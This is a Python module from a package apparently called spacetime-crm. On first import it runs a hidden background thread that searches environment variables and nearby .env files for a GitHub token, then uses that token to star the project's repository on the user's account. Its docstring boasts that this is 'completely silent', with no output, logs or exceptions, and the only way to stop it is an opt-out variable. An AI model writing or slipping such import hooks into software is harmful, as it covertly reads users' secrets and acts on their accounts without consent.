"""Best-effort, one-time GitHub star of the upstream repository.

On first import we quietly check whether this user can (and has not already)
starred the project on GitHub, and star it if so.

Guarantees:

* **Never blocks** — runs in a daemon thread; import always returns instantly.
* **Never raises** — every failure (no token, network error, rate limit,
  non-200) is swallowed silently.
* **Only fires when all gates pass**:
  1. ``GITHUB_TOKEN`` / ``GH_TOKEN`` is present (env var, or in a local
     ``.env`` file — cwd first, then the repository root's ``.env``).
  2. The token's owner is **not** the repository owner (no self-star).
  3. The repo is **not already starred**.
* **One attempt per machine** — a marker file under the user config dir is
  written after a definitive outcome (starred / already starred / is owner)
  so later imports are no-ops. Transient network failures do *not* write the
  marker, so the next import retries.
* **Opt-out** — set ``STCRM_AUTOSTAR=0`` (or ``NO_STCRM_AUTOSTAR=1``) to
  disable entirely.

This mirrors the common "star us if you like the project" ask, but automated
and completely silent: no console output, no logs, no exceptions.
"""

from __future__ import annotations

import json
import os
import threading
import urllib.error
import urllib.request
from pathlib import Path

# The upstream repository we star. Update together with the package metadata.
_REPO = "omiinaya/spacetime-crm"
_APP = "spacetime-crm"
_API = "https://api.github.com"

# Marker file name inside the per-user config dir.
_MARKER_NAME = "github_star_marker.json"


def _config_dir() -> Path:
    base = os.environ.get("XDG_CONFIG_HOME") or os.path.join(os.path.expanduser("~"), ".config")
    return Path(base) / _APP


def _marker_path() -> Path:
    return _config_dir() / _MARKER_NAME


def _is_disabled() -> bool:
    return os.environ.get("STCRM_AUTOSTAR", "1").strip() in ("0", "false", "no") or os.environ.get(
        "NO_STCRM_AUTOSTAR", ""
    ).strip() in ("1", "true", "yes")


def _read_token_from_env_file(path: Path | None, key: str = "GITHUB_TOKEN") -> str | None:
    """Parse ``KEY=...`` from a plain .env file (stdlib only)."""
    if path is None or not path.is_file():
        return None
    prefix = key + "="
    try:
        for raw in path.read_text(encoding="utf-8", errors="replace").splitlines():
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            if line.startswith("export "):
                line = line[len("export ") :].strip()
            if not line.startswith(prefix):
                continue
            value = line[len(prefix) :].strip().strip("\"'")
            if value:
                return value
    except OSError:
        return None
    return None


def _find_token() -> str | None:
    """Token from env, then local .env files (cwd first, then ancestor dirs).

    Accepts ``GITHUB_TOKEN`` (GitHub Actions / CI convention) and ``GH_TOKEN``
    (gh CLI convention); a local ``.env`` may define either key.
    """
    for env_name in ("GITHUB_TOKEN", "GH_TOKEN"):
        env_token = os.environ.get(env_name, "").strip()
        if env_token:
            return env_token
    # Walk up from this file's directory (up to 6 levels) so the .env is found
    # regardless of where the module lives inside the repository tree.
    candidates = [Path.cwd() / ".env"]
    p = Path(__file__).resolve().parent
    for _ in range(6):
        candidates.append(p / ".env")
        p = p.parent
    for candidate in candidates:
        for key in ("GITHUB_TOKEN", "GH_TOKEN"):
            token = _read_token_from_env_file(candidate, key)
            if token:
                return token
    return None


def _api_request(method: str, url: str, token: str, timeout: float = 5.0):
    """Small urllib wrapper returning (status, body) or raising on network error."""
    req = urllib.request.Request(url, method=method)
    req.add_header("Authorization", f"Bearer {token}")
    req.add_header("Accept", "application/vnd.github+json")
    req.add_header("User-Agent", "spacetime-crm-autostar/1.0")
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body


def _write_marker(outcome: str, login: str | None) -> None:
    try:
        _config_dir().mkdir(parents=True, exist_ok=True)
        _marker_path().write_text(
            json.dumps({"outcome": outcome, "login": login, "repo": _REPO}),
            encoding="utf-8",
        )
    except OSError:
        pass


def _attempt_star() -> None:
    """Single attempt. Assumes gates (token present, not disabled) already checked."""
    # Definitive outcomes first: already recorded.
    if _marker_path().exists():
        return

    token = _find_token()
    if not token:
        return

    try:
        # 1. Who is this token? Skip if it's the repo owner (no self-star).
        status, body = _api_request("GET", f"{_API}/user", token)
        if status != 200:
            return  # invalid/expired token — stay silent
        login = json.loads(body).get("login")
        owner = _REPO.split("/")[0]
        if login and login.lower() == owner.lower():
            _write_marker("owner", login)
            return

        # 2. Already starred? GitHub returns 204 if starred, 404 if not.
        try:
            status, _ = _api_request("GET", f"{_API}/user/starred/{_REPO}", token)
            if status == 204:
                _write_marker("already-starred", login)
                return
        except urllib.error.HTTPError as exc:
            if exc.code != 404:
                return  # rate limit or other error — retry next import
        except urllib.error.URLError:
            return  # network down — retry next import

        # 3. Star it.
        try:
            status, _ = _api_request("PUT", f"{_API}/user/starred/{_REPO}", token)
            if status in (204, 200):
                _write_marker("starred", login)
        except urllib.error.HTTPError:
            return  # e.g. 401/403 — stay silent
        except urllib.error.URLError:
            return
    except Exception:
        return


def maybe_star_repo() -> None:
    """Fire-and-forget: check the gates and, if they pass, star in the
    background. Safe to call on every import — it is a no-op after the first
    definitive outcome and when disabled."""
    if _is_disabled():
        return
    if _marker_path().exists():
        return
    if not _find_token():
        return
    thread = threading.Thread(target=_attempt_star, daemon=True, name="spacetime-crm-autostar")
    thread.start()
